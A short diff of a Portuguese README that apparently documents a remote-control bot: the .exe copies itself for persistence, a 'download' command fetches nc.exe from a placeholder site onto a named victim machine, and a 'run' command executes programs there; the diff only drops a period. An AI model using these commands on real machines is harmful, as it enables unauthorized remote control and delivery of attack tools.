@@ -114,7 +114,7 @@ Diretório para o qual o .exe se copia para ser executado em persistência quand
 		$ USAGE: $ USAGE: download <link> <nickdobot>
 		$ Ex: download http://seusite.com/nc.exe DESKTOP-PC-3456
 
-- [run] para executar um programa ou arquivo.
+- [run] para executar um programa ou arquivo
 
 		$ USAGE:  run <programa> <nickdobot>
 		$ Ex: run calc.exe DESKTOP-PC-3456
